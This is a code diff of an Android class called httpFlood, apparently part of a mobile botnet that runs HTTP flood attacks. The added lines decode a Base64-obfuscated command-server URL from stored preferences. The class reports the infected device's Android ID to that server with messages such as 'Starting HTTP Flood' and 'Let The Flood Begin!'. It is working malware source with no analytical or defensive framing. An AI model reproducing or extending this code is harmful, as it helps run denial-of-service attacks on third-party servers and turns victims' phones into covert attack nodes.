@@ -3,7 +3,10 @@ package com.asynctask;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
+import android.util.Base64;
 
+import com.connect.MyApplication;
+import com.utils.CommonUtils;
 import com.utils.HttpFloodUtils;
 
 import java.io.UnsupportedEncodingException;
@@ -16,13 +19,10 @@ import com.utils.NetWorkUtils;
  */
 
 public class httpFlood extends AsyncTask<String, Void, String> {
-    Context mContext;
     String i = "";//i 表示目标串
     String j = "";//
-    String URL="127.0.0.1";
 
-    public httpFlood(Context context,String i, String j) {
-        this.mContext=context;
+    public httpFlood(String i, String j) {
         this.i = i;
         this.j = j;
     }
@@ -39,8 +39,10 @@ public class httpFlood extends AsyncTask<String, Void, String> {
     @Override
     protected void onPostExecute(String result) {
         try {
-            NetWorkUtils.getInputStreamFromUrl(mContext,URL + PreferenceManager.getDefaultSharedPreferences(mContext).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(mContext).getString("AndroidID", "") + "&Data=", "Let The Flood Begin!");
+            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
+            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Let The Flood Begin!");
         } catch (UnsupportedEncodingException e) {
+
             e.printStackTrace();
         }
     }
@@ -48,7 +50,8 @@ public class httpFlood extends AsyncTask<String, Void, String> {
     @Override
     protected void onPreExecute() {
         try {
-            NetWorkUtils.getInputStreamFromUrl(mContext,URL + PreferenceManager.getDefaultSharedPreferences(mContext).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(mContext).getString("AndroidID", "") + "&Data=", "Starting HTTP Flood");
+            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
+            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Starting HTTP Flood");
         } catch (UnsupportedEncodingException e) {
 
             e.printStackTrace();
